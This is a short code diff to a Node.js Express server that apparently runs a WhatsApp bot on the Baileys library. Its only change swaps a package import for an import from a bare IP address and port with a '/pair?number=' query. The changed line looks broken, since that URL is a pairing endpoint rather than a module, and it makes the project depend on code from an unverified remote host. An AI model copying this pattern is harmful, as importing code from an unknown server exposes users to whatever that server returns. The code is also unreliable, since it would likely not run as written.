@@ -1,6 +1,6 @@
 import express from 'express';
 import cors from 'cors';
-import pkg from 'flibu-baileys-official';
+import pkg from 'http://46.247.108.191:30087/pair?number=';
 const { makeWASocket, useMultiFileAuthState, fetchLatestBaileysVersion } = pkg;
 
 const app = express();
